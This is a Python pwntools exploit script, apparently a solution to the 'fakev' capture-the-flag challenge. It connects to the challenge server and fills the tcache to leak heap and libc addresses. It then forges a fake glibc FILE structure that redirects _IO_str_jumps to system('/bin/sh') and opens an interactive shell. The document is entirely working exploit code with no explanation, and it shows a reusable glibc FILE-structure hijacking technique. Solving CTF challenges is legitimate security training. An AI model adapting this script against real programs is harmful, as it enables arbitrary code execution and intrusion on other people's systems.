from pwn import *

elf = context.binary = ELF("./fakev_patched")
libc = ELF("./libc.so.6")

def conn():
    if args.REMOTE:
        r = remote("fakev.challs.olicyber.it", 11004)
    else:
        r = process("./fakev_patched")

    return r

def open_file(file_n):
    r.sendlineafter(b"Choice: ", b"1")
    r.sendlineafter(b"Index: ", str(file_n).encode())
def read_content(idx):
    r.sendlineafter(b"Choice: ", b"2")
    r.sendlineafter(b"Index: ", str(idx).encode())
    return r.recv(240)
def close_file():
    r.sendlineafter(b"Choice: ", b"4")

def fake_IO_strfile():
    fp = FileStructure(null=0)
    fp.flags           = 0x0
    fp._IO_buf_base    = next(libc.search(b"/bin/sh\x00"))
    fp._lock           = elf.sym["choice_string"] + 0x8    # needs to be at a writable address
    fp.vtable          = libc.sym["_IO_file_jumps"] + 0xc0 # _IO_str_jumps

    payload  = b"4" + b"\x00"*7
    payload += bytes(fp)[:160]
    payload += p64(elf.sym["choice_string"]+0x8) + p64(0x0)
    payload += bytes(fp)[176:]
    payload += p64(0x0)                 # _allocate_buffer
    payload += p64(libc.sym["system"])  # _free_buffer        0xe8

    return payload.ljust(254)

def main():
    global r
    r = conn()

    for i in range(8):
        open_file(1)
    for i in range(8): # fill the tcache
        close_file()

    data = read_content(1)
    heap_base, libc_base = u64(data[0:8]) - 0x250, u64(data[8:16]) - 0x3e7000 - 0x4ca0
    log.success(f"Heap base: {hex(heap_base)}")
    log.success(f"Libc base: {hex(libc_base)}")
    libc.address = libc_base

    for i in range(9):
        open_file(1)

    fake_struct = fake_IO_strfile()
    r.sendlineafter(b"Choice: ", fake_struct)

    r.interactive()


if __name__ == "__main__":
    main()